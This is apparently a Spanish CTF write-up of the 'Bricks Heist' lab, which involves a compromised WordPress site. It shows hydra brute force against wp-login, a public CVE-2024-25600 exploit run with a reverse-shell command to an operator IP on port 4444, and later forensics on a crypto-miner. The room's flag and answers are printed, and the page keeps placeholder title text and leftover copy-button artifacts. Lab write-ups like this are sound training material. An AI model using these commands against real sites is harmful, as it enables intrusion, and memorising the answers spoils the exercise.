---
title: "asfasf"
platform: "HTB"
publishedAt: 2025-05-29
cover: "/images/ctf/nota5-cover.webp"
preview: "brtbtbrtbrt"
tags: []
link: "Sin link"
toc:
  - text: "🕵️ Introducción"
    id: "introduccion"
  - text: "🔍 1. Escaneo inicial"
    id: "1-escaneo-inicial"
  - text: "🧱 2. Enumeración de WordPress"
    id: "2-enumeracion-de-wordpress"
  - text: "🔓 3. Acceso administrativo"
    id: "3-acceso-administrativo"
  - text: "💣 4. Exploiting CVE-2024-25600"
    id: "4-exploiting-cve-2024-25600"
  - text: "🐚 5. Post-explotación"
    id: "5-post-explotacion"
  - text: "🔍 6. Proceso y servicio sospechoso"
    id: "6-proceso-y-servicio-sospechoso"
  - text: "📄 7. Log del miner"
    id: "7-log-del-miner"
  - text: "💰 8. Wallet del miner"
    id: "8-wallet-del-miner"
  - text: "🕵️‍♂️ 9. Threat group"
    id: "9-threat-group"
  - text: "✅ Conclusión"
    id: "conclusion"
---

![image.png](/images/ctf/nota5-0.webp)


# 🧱 Bricks Heist – TryHackMe (Write-up)


[embed]()


## 🕵️ Introducción


Un sitio web WordPress fue comprometido. Nuestra misión: identificar el punto de entrada, recuperar acceso como administrador, detectar actividad maliciosa (minería), y rastrear al grupo de amenazas involucrado.


---


## 🔍 1. Escaneo inicial


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Servicios expuestos:

- 22: SSH
- 80: WebSockify (error 405)
- 443: WordPress 6.5
- 3306: MySQL (sin acceso)

---


## 🧱 2. Enumeración de WordPress

- Se detecta **tema activo: Bricks**
- Vulnerabilidad conocida: **CVE-2024-25600**
- Exploit público descargado desde GitHub

---


## 🔓 3. Acceso administrativo


Se obtuvo login con `administrator`, mediante fuerza bruta con `hydra`:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💣 4. Exploiting CVE-2024-25600


Se usó el script:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


Ejemplo:


```shell
bash
CopyEdit
python3 CVE-2024-25600.py \
  --url https://bricks.thm \
  --username administrator \
  --password TU_PASS \
  --cmd "bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"
```


Se obtuvo **shell interactiva**.


---


## 🐚 5. Post-explotación


### Flag encontrada:


```plain text
css
CopyEdit
/var/www/html/650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```


---


## 🔍 6. Proceso y servicio sospechoso


### Proceso:


```plain text
pgsql
CopyEdit
nm-inet-dialog
```


### Servicio malicioso:


```plain text
CopyEdit
ubuntu.service - TRYHACK3M
```


Verificado vía:


```shell
bash
CopyEdit
systemctl status ubuntu.service
```


---


## 📄 7. Log del miner


Log activo ubicado en:


```plain text
bash
CopyEdit
/lib/NetworkManager/inet.conf
```


📌 **Respuesta (formato** **`xxxx.xxxx`****)**:


```plain text
pgsql
CopyEdit
inet.conf
```


---


## 💰 8. Wallet del miner


Del archivo `inet.conf`:


```plain text
text
CopyEdit
ID: WW1NeGNY...
```


Base64 → doble decode → wallet final:


```plain text
nginx
CopyEdit
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


---


## 🕵️‍♂️ 9. Threat group


Wallet está asociada con el grupo de ransomware:


**LockBit**


(Confirmado por búsquedas OSINT y análisis de blockchain)


---


## ✅ Conclusión


Este CTF fue un excelente caso realista que combinó:

- Enumeración
- Explotación de CVE
- Análisis forense de logs y procesos
- Técnicas OSINT

Una gran práctica para pentesters y analistas de amenazas.

